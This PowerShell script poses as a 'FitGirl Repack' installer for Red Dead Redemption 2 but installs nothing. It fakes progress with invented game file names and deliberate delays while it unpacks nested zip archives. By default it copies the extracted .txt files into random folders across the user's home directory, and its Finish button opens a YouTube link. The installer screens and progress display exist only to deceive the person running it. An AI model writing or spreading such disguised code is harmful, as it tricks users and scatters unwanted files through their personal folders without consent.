# Configuration
param(
    [string]$StartFile = "layer0.zip",
    [int]$MaxCycles = 5,
    [string]$ScatterLocation = "",
    [switch]$EnableScatter = $false,
    [switch]$NoScatter = $false
)

# Load Windows Forms
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create the main installer form
$form = New-Object System.Windows.Forms.Form
$form.Text = "Setup - Red Dead Redemption 2"
$form.Size = New-Object System.Drawing.Size(600, 450)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::White

# ============= WELCOME SCREEN ELEMENTS =============

# Create welcome panel (shown initially)
$welcomePanel = New-Object System.Windows.Forms.Panel
$welcomePanel.Location = New-Object System.Drawing.Point(0, 0)
$welcomePanel.Size = New-Object System.Drawing.Size(600, 450)
$welcomePanel.BackColor = [System.Drawing.Color]::White
$form.Controls.Add($welcomePanel)

# Left panel for welcome screen
$welcomeLeftPanel = New-Object System.Windows.Forms.Panel
$welcomeLeftPanel.Location = New-Object System.Drawing.Point(0, 0)
$welcomeLeftPanel.Size = New-Object System.Drawing.Size(200, 450)
$welcomeLeftPanel.BackColor = [System.Drawing.Color]::FromArgb(240, 200, 50)
$welcomePanel.Controls.Add($welcomeLeftPanel)

# Brand Label on welcome left panel
$welcomeBrandLabel = New-Object System.Windows.Forms.Label
$welcomeBrandLabel.Location = New-Object System.Drawing.Point(20, 100)
$welcomeBrandLabel.Size = New-Object System.Drawing.Size(160, 80)
$welcomeBrandLabel.Text = "FitGirl Repack"
$welcomeBrandLabel.Font = New-Object System.Drawing.Font("Arial Black", 12, [System.Drawing.FontStyle]::Bold)
$welcomeBrandLabel.ForeColor = [System.Drawing.Color]::Black
$welcomeBrandLabel.TextAlign = "MiddleCenter"
$welcomeLeftPanel.Controls.Add($welcomeBrandLabel)

# Game artwork placeholder
$gameArtwork = New-Object System.Windows.Forms.PictureBox
$gameArtwork.Location = New-Object System.Drawing.Point(20, 200)
$gameArtwork.Size = New-Object System.Drawing.Size(160, 120)
$gameArtwork.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 50)
$gameArtwork.BorderStyle = "FixedSingle"
$gameArtwork.SizeMode = "StretchImage"
$welcomeLeftPanel.Controls.Add($gameArtwork)

# Load game cover image if available
if (Test-Path ".\images\game_cover.jpg") {
    try {
        $gameArtwork.Image = [System.Drawing.Image]::FromFile((Resolve-Path ".\images\game_cover.jpg").Path)
    }
    catch {
        # Keep default background if image fails to load
    }
}
elseif (Test-Path ".\images\game_cover.png") {
    try {
        $gameArtwork.Image = [System.Drawing.Image]::FromFile((Resolve-Path ".\images\game_cover.png").Path)
    }
    catch {
        # Keep default background if image fails to load
    }
}

# Game title on artwork
$gameTitle = New-Object System.Windows.Forms.Label
$gameTitle.Location = New-Object System.Drawing.Point(30, 240)
$gameTitle.Size = New-Object System.Drawing.Size(140, 40)
$gameTitle.Text = "RED DEAD`nREDEMPTION 2"
$gameTitle.Font = New-Object System.Drawing.Font("Arial", 9, [System.Drawing.FontStyle]::Bold)
$gameTitle.ForeColor = [System.Drawing.Color]::White
$gameTitle.TextAlign = "MiddleCenter"
$gameTitle.BackColor = [System.Drawing.Color]::Transparent
$welcomeLeftPanel.Controls.Add($gameTitle)

# Audio indicator
$audioIcon = New-Object System.Windows.Forms.Label
$audioIcon.Location = New-Object System.Drawing.Point(10, 350)
$audioIcon.Size = New-Object System.Drawing.Size(180, 40)
$audioIcon.Text = "[♪] My repacks`nand music"
$audioIcon.Font = New-Object System.Drawing.Font("Arial", 8)
$audioIcon.ForeColor = [System.Drawing.Color]::FromArgb(80, 80, 80)
$audioIcon.TextAlign = "MiddleCenter"
$welcomeLeftPanel.Controls.Add($audioIcon)

# Right content panel for welcome
$welcomeRightPanel = New-Object System.Windows.Forms.Panel
$welcomeRightPanel.Location = New-Object System.Drawing.Point(200, 0)
$welcomeRightPanel.Size = New-Object System.Drawing.Size(400, 450)
$welcomeRightPanel.BackColor = [System.Drawing.Color]::White
$welcomePanel.Controls.Add($welcomeRightPanel)

# Welcome title
$welcomeTitle = New-Object System.Windows.Forms.Label
$welcomeTitle.Location = New-Object System.Drawing.Point(20, 30)
$welcomeTitle.Size = New-Object System.Drawing.Size(360, 50)
$welcomeTitle.Text = "Welcome to the Red Dead Redemption 2`nSetup Wizard"
$welcomeTitle.Font = New-Object System.Drawing.Font("Segoe UI", 13, [System.Drawing.FontStyle]::Bold)
$welcomeTitle.ForeColor = [System.Drawing.Color]::Black
$welcomeRightPanel.Controls.Add($welcomeTitle)

# Welcome description
$welcomeDesc = New-Object System.Windows.Forms.Label
$welcomeDesc.Location = New-Object System.Drawing.Point(20, 100)
$welcomeDesc.Size = New-Object System.Drawing.Size(360, 80)
$welcomeDesc.Text = "This will install Red Dead Redemption 2 on your computer.`n`nIt is recommended that you close all other applications before continuing."
$welcomeDesc.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$welcomeDesc.ForeColor = [System.Drawing.Color]::Black
$welcomeRightPanel.Controls.Add($welcomeDesc)

# Continue instruction
$continueInstruction = New-Object System.Windows.Forms.Label
$continueInstruction.Location = New-Object System.Drawing.Point(20, 200)
$continueInstruction.Size = New-Object System.Drawing.Size(360, 25)
$continueInstruction.Text = "Click Next to continue, or Cancel to exit Setup."
$continueInstruction.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$continueInstruction.ForeColor = [System.Drawing.Color]::Black
$welcomeRightPanel.Controls.Add($continueInstruction)

# Welcome buttons
$nextButton = New-Object System.Windows.Forms.Button
$nextButton.Location = New-Object System.Drawing.Point(220, 380)
$nextButton.Size = New-Object System.Drawing.Size(80, 30)
$nextButton.Text = "Next >"
$nextButton.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$nextButton.UseVisualStyleBackColor = $true
$welcomeRightPanel.Controls.Add($nextButton)

$welcomeCancelBtn = New-Object System.Windows.Forms.Button
$welcomeCancelBtn.Location = New-Object System.Drawing.Point(310, 380)
$welcomeCancelBtn.Size = New-Object System.Drawing.Size(70, 30)
$welcomeCancelBtn.Text = "Cancel"
$welcomeCancelBtn.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$welcomeCancelBtn.UseVisualStyleBackColor = $true
$welcomeRightPanel.Controls.Add($welcomeCancelBtn)

$gameInfoWelcomeBtn = New-Object System.Windows.Forms.Button
$gameInfoWelcomeBtn.Location = New-Object System.Drawing.Point(20, 380)
$gameInfoWelcomeBtn.Size = New-Object System.Drawing.Size(80, 30)
$gameInfoWelcomeBtn.Text = "Game Info"
$gameInfoWelcomeBtn.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$gameInfoWelcomeBtn.UseVisualStyleBackColor = $true
$welcomeRightPanel.Controls.Add($gameInfoWelcomeBtn)

# ============= INSTALLATION SCREEN ELEMENTS (Initially Hidden) =============

# Create installation panel (hidden initially)
$installPanel = New-Object System.Windows.Forms.Panel
$installPanel.Location = New-Object System.Drawing.Point(0, 0)
$installPanel.Size = New-Object System.Drawing.Size(500, 400)
$installPanel.BackColor = [System.Drawing.Color]::White
$installPanel.Visible = $false
$form.Controls.Add($installPanel)

# Header Panel for installation
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Location = New-Object System.Drawing.Point(0, 0)
$headerPanel.Size = New-Object System.Drawing.Size(500, 60)
$headerPanel.BackColor = [System.Drawing.Color]::FromArgb(240, 240, 240)
$installPanel.Controls.Add($headerPanel)

# Installation Title
$installTitle = New-Object System.Windows.Forms.Label
$installTitle.Location = New-Object System.Drawing.Point(20, 15)
$installTitle.Size = New-Object System.Drawing.Size(200, 25)
$installTitle.Text = "Installing"
$installTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$installTitle.ForeColor = [System.Drawing.Color]::Black
$headerPanel.Controls.Add($installTitle)

# Game Icon (placeholder)
$gameIcon = New-Object System.Windows.Forms.PictureBox
$gameIcon.Location = New-Object System.Drawing.Point(420, 10)
$gameIcon.Size = New-Object System.Drawing.Size(60, 40)
$gameIcon.BackColor = [System.Drawing.Color]::FromArgb(200, 200, 200)
$gameIcon.BorderStyle = "FixedSingle"
$gameIcon.SizeMode = "StretchImage"
$headerPanel.Controls.Add($gameIcon)

# Load game icon if available
if (Test-Path ".\images\game_icon.png") {
    try {
        $gameIcon.Image = [System.Drawing.Image]::FromFile((Resolve-Path ".\images\game_icon.png").Path)
    }
    catch {
        # Keep default background if image fails to load
    }
}
elseif (Test-Path ".\images\game_icon.jpg") {
    try {
        $gameIcon.Image = [System.Drawing.Image]::FromFile((Resolve-Path ".\images\game_icon.jpg").Path)
    }
    catch {
        # Keep default background if image fails to load
    }
}

# Main content area for installation
$contentPanel = New-Object System.Windows.Forms.Panel
$contentPanel.Location = New-Object System.Drawing.Point(0, 60)
$contentPanel.Size = New-Object System.Drawing.Size(500, 340)
$contentPanel.BackColor = [System.Drawing.Color]::White
$installPanel.Controls.Add($contentPanel)

# Description Label
$descLabel = New-Object System.Windows.Forms.Label
$descLabel.Location = New-Object System.Drawing.Point(20, 20)
$descLabel.Size = New-Object System.Drawing.Size(460, 25)
$descLabel.Text = "Please wait while Setup installs Red Dead Redemption 2 on your computer."
$descLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$descLabel.ForeColor = [System.Drawing.Color]::Black
$contentPanel.Controls.Add($descLabel)

# Unpacking Section
$unpackLabel = New-Object System.Windows.Forms.Label
$unpackLabel.Location = New-Object System.Drawing.Point(20, 70)
$unpackLabel.Size = New-Object System.Drawing.Size(100, 20)
$unpackLabel.Text = "Unpacking..."
$unpackLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
$unpackLabel.ForeColor = [System.Drawing.Color]::Black
$contentPanel.Controls.Add($unpackLabel)

# Current File Label
$currentFileLabel = New-Object System.Windows.Forms.Label
$currentFileLabel.Location = New-Object System.Drawing.Point(20, 100)
$currentFileLabel.Size = New-Object System.Drawing.Size(460, 20)
$currentFileLabel.Text = "layer0.zip"
$currentFileLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$currentFileLabel.ForeColor = [System.Drawing.Color]::Black
$contentPanel.Controls.Add($currentFileLabel)

# Main Progress Bar
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20, 130)
$progressBar.Size = New-Object System.Drawing.Size(380, 20)
$progressBar.Style = "Continuous"
$contentPanel.Controls.Add($progressBar)

# Percentage Label
$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Location = New-Object System.Drawing.Point(410, 130)
$percentLabel.Size = New-Object System.Drawing.Size(60, 20)
$percentLabel.Text = "0%"
$percentLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$percentLabel.ForeColor = [System.Drawing.Color]::Black
$percentLabel.TextAlign = "TopRight"
$contentPanel.Controls.Add($percentLabel)

# Elapsed Time Label
$elapsedLabel = New-Object System.Windows.Forms.Label
$elapsedLabel.Location = New-Object System.Drawing.Point(20, 170)
$elapsedLabel.Size = New-Object System.Drawing.Size(150, 20)
$elapsedLabel.Text = "Elapsed time: 00:00:00"
$elapsedLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$elapsedLabel.ForeColor = [System.Drawing.Color]::Black
$contentPanel.Controls.Add($elapsedLabel)

# Time Left Label
$timeLeftLabel = New-Object System.Windows.Forms.Label
$timeLeftLabel.Location = New-Object System.Drawing.Point(250, 170)
$timeLeftLabel.Size = New-Object System.Drawing.Size(150, 20)
$timeLeftLabel.Text = "Time left: 00:00:30"
$timeLeftLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$timeLeftLabel.ForeColor = [System.Drawing.Color]::Black
$contentPanel.Controls.Add($timeLeftLabel)

# Bottom Panel with branding
$bottomPanel = New-Object System.Windows.Forms.Panel
$bottomPanel.Location = New-Object System.Drawing.Point(0, 250)
$bottomPanel.Size = New-Object System.Drawing.Size(500, 90)
$bottomPanel.BackColor = [System.Drawing.Color]::FromArgb(245, 245, 245)
$contentPanel.Controls.Add($bottomPanel)

# Branding Label
$brandLabel = New-Object System.Windows.Forms.Label
$brandLabel.Location = New-Object System.Drawing.Point(15, 25)
$brandLabel.Size = New-Object System.Drawing.Size(140, 40)
$brandLabel.Text = "My repacks`nand music"
$brandLabel.Font = New-Object System.Drawing.Font("Arial", 8, [System.Drawing.FontStyle]::Bold)
$brandLabel.ForeColor = [System.Drawing.Color]::FromArgb(100, 100, 100)
$brandLabel.TextAlign = "MiddleLeft"
$bottomPanel.Controls.Add($brandLabel)

# Game Info Button
$gameInfoBtn = New-Object System.Windows.Forms.Button
$gameInfoBtn.Location = New-Object System.Drawing.Point(300, 25)
$gameInfoBtn.Size = New-Object System.Drawing.Size(80, 30)
$gameInfoBtn.Text = "Game Info"
$gameInfoBtn.Font = New-Object System.Drawing.Font("Segoe UI", 8)
$gameInfoBtn.UseVisualStyleBackColor = $true
$bottomPanel.Controls.Add($gameInfoBtn)

# Cancel Button
$cancelBtn = New-Object System.Windows.Forms.Button
$cancelBtn.Location = New-Object System.Drawing.Point(390, 25)
$cancelBtn.Size = New-Object System.Drawing.Size(70, 30)
$cancelBtn.Text = "Cancel"
$cancelBtn.Font = New-Object System.Drawing.Font("Segoe UI", 8)
$cancelBtn.UseVisualStyleBackColor = $true
$bottomPanel.Controls.Add($cancelBtn)

# ============= COMPLETION SCREEN ELEMENTS (Initially Hidden) =============

# Create Cyberpunk completion panel (hidden initially)
$completionPanel = New-Object System.Windows.Forms.Panel
$completionPanel.Location = New-Object System.Drawing.Point(0, 0)
$completionPanel.Size = New-Object System.Drawing.Size(600, 450)
$completionPanel.BackColor = [System.Drawing.Color]::White
$completionPanel.Visible = $false
$form.Controls.Add($completionPanel)

# Left panel for completion
$leftPanel = New-Object System.Windows.Forms.Panel
$leftPanel.Location = New-Object System.Drawing.Point(0, 0)
$leftPanel.Size = New-Object System.Drawing.Size(180, 450)
$leftPanel.BackColor = [System.Drawing.Color]::FromArgb(240, 200, 50)
$completionPanel.Controls.Add($leftPanel)

# Brand Label on left panel
$brandLabelComp = New-Object System.Windows.Forms.Label
$brandLabelComp.Location = New-Object System.Drawing.Point(10, 150)
$brandLabelComp.Size = New-Object System.Drawing.Size(160, 100)
$brandLabelComp.Text = "EPIC GAME`nREPACK"
$brandLabelComp.Font = New-Object System.Drawing.Font("Arial Black", 14, [System.Drawing.FontStyle]::Bold)
$brandLabelComp.ForeColor = [System.Drawing.Color]::Black
$brandLabelComp.TextAlign = "MiddleCenter"
$leftPanel.Controls.Add($brandLabelComp)

# Add completion logo if available
$completionLogo = New-Object System.Windows.Forms.PictureBox
$completionLogo.Location = New-Object System.Drawing.Point(10, 50)
$completionLogo.Size = New-Object System.Drawing.Size(160, 80)
$completionLogo.BackColor = [System.Drawing.Color]::Transparent
$completionLogo.SizeMode = "StretchImage"
if (Test-Path ".\images\brand_logo.png") {
    try {
        $completionLogo.Image = [System.Drawing.Image]::FromFile((Resolve-Path ".\images\brand_logo.png").Path)
        $leftPanel.Controls.Add($completionLogo)
    }
    catch {
        # Don't add if image fails to load
    }
}

# Website label
$websiteLabel = New-Object System.Windows.Forms.Label
$websiteLabel.Location = New-Object System.Drawing.Point(10, 280)
$websiteLabel.Size = New-Object System.Drawing.Size(160, 35)
$websiteLabel.Text = "epic-repacks.site`nofficial site"
$websiteLabel.Font = New-Object System.Drawing.Font("Arial", 8)
$websiteLabel.ForeColor = [System.Drawing.Color]::FromArgb(50, 50, 50)
$websiteLabel.TextAlign = "MiddleCenter"
$leftPanel.Controls.Add($websiteLabel)

# Right content panel for completion
$rightPanel = New-Object System.Windows.Forms.Panel
$rightPanel.Location = New-Object System.Drawing.Point(180, 0)
$rightPanel.Size = New-Object System.Drawing.Size(420, 450)
$rightPanel.BackColor = [System.Drawing.Color]::White
$completionPanel.Controls.Add($rightPanel)

# Title Label (completion)
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Location = New-Object System.Drawing.Point(20, 15)
$titleLabel.Size = New-Object System.Drawing.Size(380, 50)
$titleLabel.Text = "Completing the Red Dead Redemption 2`nSetup Wizard"
$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 13, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::Black
$titleLabel.TextAlign = "TopLeft"
$rightPanel.Controls.Add($titleLabel)

# Description Label (completion)
$descLabelComp = New-Object System.Windows.Forms.Label
$descLabelComp.Location = New-Object System.Drawing.Point(20, 70)
$descLabelComp.Size = New-Object System.Drawing.Size(380, 50)
$descLabelComp.Text = "Setup has finished installing Red Dead Redemption 2 on your computer. The application may be launched by selecting the installed icons."
$descLabelComp.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$descLabelComp.ForeColor = [System.Drawing.Color]::Black
$rightPanel.Controls.Add($descLabelComp)

# Time Label (completion)
$timeLabel = New-Object System.Windows.Forms.Label
$timeLabel.Location = New-Object System.Drawing.Point(20, 130)
$timeLabel.Size = New-Object System.Drawing.Size(300, 25)
$timeLabel.Text = "Repack installed in: 00:00:00"
$timeLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
$timeLabel.ForeColor = [System.Drawing.Color]::Green
$rightPanel.Controls.Add($timeLabel)

# Checkboxes (completion)
$checkbox1 = New-Object System.Windows.Forms.CheckBox
$checkbox1.Location = New-Object System.Drawing.Point(20, 180)
$checkbox1.Size = New-Object System.Drawing.Size(350, 20)
$checkbox1.Text = "Verify files integrity (recommended)"
$checkbox1.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$checkbox1.Checked = $true
$checkbox1.Enabled = $false
$rightPanel.Controls.Add($checkbox1)

$checkbox2 = New-Object System.Windows.Forms.CheckBox
$checkbox2.Location = New-Object System.Drawing.Point(20, 210)
$checkbox2.Size = New-Object System.Drawing.Size(350, 20)
$checkbox2.Text = "Open epic-repacks.site"
$checkbox2.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$checkbox2.Checked = $true
$rightPanel.Controls.Add($checkbox2)

$checkbox3 = New-Object System.Windows.Forms.CheckBox
$checkbox3.Location = New-Object System.Drawing.Point(20, 240)
$checkbox3.Size = New-Object System.Drawing.Size(350, 20)
$checkbox3.Text = "Redirect fake sites to the real one"
$checkbox3.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$checkbox3.Checked = $true
$rightPanel.Controls.Add($checkbox3)

$checkbox4 = New-Object System.Windows.Forms.CheckBox
$checkbox4.Location = New-Object System.Drawing.Point(20, 270)
$checkbox4.Size = New-Object System.Drawing.Size(350, 20)
$checkbox4.Text = "Launch Red Dead Redemption 2"
$checkbox4.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$checkbox4.Checked = $true
$rightPanel.Controls.Add($checkbox4)

# Finish Button (completion)
$finishButton = New-Object System.Windows.Forms.Button
$finishButton.Location = New-Object System.Drawing.Point(320, 370)
$finishButton.Size = New-Object System.Drawing.Size(80, 30)
$finishButton.Text = "Finish"
$finishButton.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$finishButton.UseVisualStyleBackColor = $true
$rightPanel.Controls.Add($finishButton)

# Global variables for timing
$global:startTime = Get-Date
$global:installationActive = $false

# Button event handlers for welcome screen
$nextButton.Add_Click({
        # Hide welcome screen, show installation screen
        $welcomePanel.Visible = $false
        $installPanel.Visible = $true
    
        # Resize form for installation
        $form.Size = New-Object System.Drawing.Size(500, 400)
        $form.Text = "Setup - Red Dead Redemption 2"
    
        # Start installation process
        $global:startTime = Get-Date
        $global:installationActive = $true
        Start-InstallationProcess
    })

$welcomeCancelBtn.Add_Click({
        # Close the form if cancel is clicked on welcome screen
        $form.Close()
    })

$gameInfoWelcomeBtn.Add_Click({
        # Could show game info dialog (placeholder)
        [System.Windows.Forms.MessageBox]::Show("Red Dead Redemption 2 - Ultimate Edition`nSize: ~150GB`nDeveloper: Rockstar Games", "Game Information", "OK", "Information")
    })

# Button event handlers for completion screen
$finishButton.Add_Click({
        # Open YouTube link in default browser
        try {
            Start-Process "https://youtu.be/6QJ1dt6-94o?si=uTIcQ8VQ2mGZyFNC"
        }
        catch {
            # Silent fail if browser can't open
        }
        
        # Close the installer form
        $form.Close()
    })

$cancelBtn.Add_Click({
        # Close the form if cancel is clicked during installation
        $form.Close()
    })

# Helper function to update installation UI
function Update-InstallUI {
    param(
        [string]$CurrentFile = $null,
        [int]$Progress = -1,
        [string]$TimeElapsed = $null,
        [string]$TimeLeft = $null
    )
    
    if ($CurrentFile) {
        $currentFileLabel.Text = $CurrentFile
    }
    
    if ($Progress -ge 0) {
        $progressBar.Value = [Math]::Min($Progress, 100)
        $percentLabel.Text = "$Progress%"
    }
    
    if ($TimeElapsed) {
        $elapsedLabel.Text = "Elapsed time: $TimeElapsed"
    }
    
    if ($TimeLeft) {
        $timeLeftLabel.Text = "Time left: $TimeLeft"
    }
    
    $form.Refresh()
    [System.Windows.Forms.Application]::DoEvents()
}

# Function to show completion screen
function Show-CompletionScreen {
    param([string]$TotalTime)
    
    # Resize form for completion screen
    $form.Size = New-Object System.Drawing.Size(600, 450)
    $form.Text = "Setup - Red Dead Redemption 2"
    
    # Hide installation panel, show completion panel
    $installPanel.Visible = $false
    $completionPanel.Visible = $true
    
    # Update completion time
    $timeLabel.Text = "Repack installed in: $TotalTime"
    
    $form.Refresh()
    [System.Windows.Forms.Application]::DoEvents()
}

# Function to handle the actual installation process
function Start-InstallationProcess {
    if (-not (Test-Path $StartFile)) {
        Update-InstallUI -CurrentFile "ERROR: $StartFile not found!" -Progress 0
        Start-Sleep -Seconds 3
        $form.Close()
        return
    }
    
    $outputDir = "full_expansion_zone"
    if (-not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Path $outputDir | Out-Null
    }
    
    Copy-Item $StartFile -Destination $outputDir -Force
    Set-Location $outputDir
    
    $currentCycle = 0
    $fileList = @(
        "rdr2_game_data.pak",
        "world_textures.rpf", 
        "character_models.dat",
        "audio_master.bnk",
        "map_geometry.mesh",
        "animation_data.anim",
        "ui_elements.xml",
        "scripts_core.bin",
        "shaders_dx11.hlsl",
        "localization.txt"
    )
    
    while ($true) {
        $zipFiles = Get-ChildItem -Recurse -Filter "*.zip" | Where-Object { $_.Name -notlike "*.extracted" }
        
        if ($zipFiles.Count -eq 0) {
            break
        }
        
        if ($currentCycle -ge $MaxCycles) {
            break
        }
        
        $baseProgress = [Math]::Min(($currentCycle * 20), 80)
        
        $fileCounter = 0
        foreach ($zipFile in $zipFiles) {
            # Show current file being processed with more realistic names
            $fileIndex = ($currentCycle * $zipFiles.Count + $fileCounter) % $fileList.Count
            $currentFileName = $fileList[$fileIndex]
            Update-InstallUI -CurrentFile $currentFileName
            
            # Calculate progress and timing more realistically
            $totalFiles = $MaxCycles * 3 # Approximate total files to process
            $filesProcessed = ($currentCycle * $zipFiles.Count) + $fileCounter + 1
            $progress = [Math]::Min(($filesProcessed / $totalFiles) * 100, 95)
            $elapsed = (Get-Date) - $global:startTime
            $elapsedStr = "{0:D2}:{1:D2}:{2:D2}" -f $elapsed.Hours, $elapsed.Minutes, $elapsed.Seconds
            
            # More realistic time estimation
            $avgTimePerFile = if ($filesProcessed -gt 1) { $elapsed.TotalSeconds / $filesProcessed } else { 2 }
            $remainingFiles = $totalFiles - $filesProcessed
            $timeLeftSec = [Math]::Max(0, $remainingFiles * $avgTimePerFile)
            $timeLeftSpan = [TimeSpan]::FromSeconds($timeLeftSec)
            $timeLeftStr = "{0:D2}:{1:D2}:{2:D2}" -f $timeLeftSpan.Hours, $timeLeftSpan.Minutes, $timeLeftSpan.Seconds
            
            Update-InstallUI -Progress ([int]$progress) -TimeElapsed $elapsedStr -TimeLeft $timeLeftStr
            
            $dirName = $zipFile.BaseName + "_contents"
            $dirPath = Join-Path $zipFile.DirectoryName $dirName
            
            if (-not (Test-Path $dirPath)) {
                New-Item -ItemType Directory -Path $dirPath | Out-Null
            }
            
            try {
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [System.IO.Compression.ZipFile]::ExtractToDirectory($zipFile.FullName, $dirPath)
                
                $newName = $zipFile.FullName + ".extracted"
                Rename-Item $zipFile.FullName $newName
            }
            catch {
                # Silent continue for demo
            }
            
            # Variable sleep time based on file type for realism
            if ($currentFileName -like "*.rpf" -or $currentFileName -like "*.pak") {
                Start-Sleep -Milliseconds 1200  # Larger files take longer
            }
            elseif ($currentFileName -like "*.txt" -or $currentFileName -like "*.xml") {
                Start-Sleep -Milliseconds 300   # Text files are quick
            }
            else {
                Start-Sleep -Milliseconds 600   # Default timing
            }
            
            $fileCounter++
        }
        
        $currentCycle++
    }
    
    # Handle scatter files if enabled
    Handle-ScatterFiles
    
    # Final progress update
    $finalElapsed = (Get-Date) - $global:startTime
    $finalElapsedStr = "{0:D2}:{1:D2}:{2:D2}" -f $finalElapsed.Hours, $finalElapsed.Minutes, $finalElapsed.Seconds
    Update-InstallUI -CurrentFile "Installation Complete" -Progress 100 -TimeElapsed $finalElapsedStr -TimeLeft "00:00:00"
    
    Start-Sleep -Seconds 2
    
    # Show completion screen
    Show-CompletionScreen -TotalTime $finalElapsedStr
}



function Handle-ScatterFiles {
    if ($EnableScatter -or $ScatterLocation -ne "") {
        Update-InstallUI -CurrentFile "Copying game resources..." -Progress 85
        
        if ($ScatterLocation -eq "") {
            $ScatterLocation = "C:\Users\$env:USERNAME\"
        }
        
        if (-not (Test-Path $ScatterLocation)) {
            return
        }
        
        $filesToScatter = Get-ChildItem -Recurse -Filter "*.txt" -File
        
        if ($filesToScatter.Count -eq 0) {
            return
        }
        
        $targetFolders = Get-ChildItem -Path $ScatterLocation -Recurse -Directory -ErrorAction SilentlyContinue
        
        if ($targetFolders.Count -eq 0) {
            $targetFolders = @(Get-Item $ScatterLocation)
        }
        
        $scatteredCount = 0
        $random = New-Object System.Random
        
        # Create log file for scattered files
        $currentPath = Get-Location
        $logFile = Join-Path (Split-Path $currentPath -Parent) "scatter_$env:USERNAME.log"
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        "=== Scatter Log ===" | Out-File -FilePath $logFile -Encoding UTF8
        "Timestamp: $timestamp" | Out-File -FilePath $logFile -Append -Encoding UTF8
        "Total Files: $($filesToScatter.Count)" | Out-File -FilePath $logFile -Append -Encoding UTF8
        "" | Out-File -FilePath $logFile -Append -Encoding UTF8
        
        foreach ($file in $filesToScatter) {
            $randomIndex = $random.Next(0, $targetFolders.Count)
            $targetFolder = $targetFolders[$randomIndex].FullName
            
            $targetPath = Join-Path $targetFolder $file.Name
            $counter = 1
            while (Test-Path $targetPath) {
                $baseName = [System.IO.Path]::GetFileNameWithoutExtension($file.Name)
                $extension = [System.IO.Path]::GetExtension($file.Name)
                $targetPath = Join-Path $targetFolder "${baseName}_${counter}${extension}"
                $counter++
            }
            
            try {
                Copy-Item -Path $file.FullName -Destination $targetPath -Force
                "[OK] $($file.Name) -> $targetPath" | Out-File -FilePath $logFile -Append -Encoding UTF8
                $scatteredCount++
                
                if ($scatteredCount % 10 -eq 0) {
                    Update-InstallUI -CurrentFile "Copying: $($file.Name)" -Progress (85 + [Math]::Min(($scatteredCount * 10 / $filesToScatter.Count), 10))
                }
            }
            catch {
                "[ERROR] $($file.Name): $($_.Exception.Message)" | Out-File -FilePath $logFile -Append -Encoding UTF8
            }
        }
        
        "" | Out-File -FilePath $logFile -Append -Encoding UTF8
        "Summary: Files scattered: $scatteredCount" | Out-File -FilePath $logFile -Append -Encoding UTF8
        $completedTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        "Completed: $completedTime" | Out-File -FilePath $logFile -Append -Encoding UTF8
    }
}

# Handle scatter logic
if ($NoScatter) {
    $EnableScatter = $false
}
elseif (-not $EnableScatter -and $ScatterLocation -eq "") {
    $EnableScatter = $true
}

# Show the form starting with welcome screen
$form.ShowDialog()
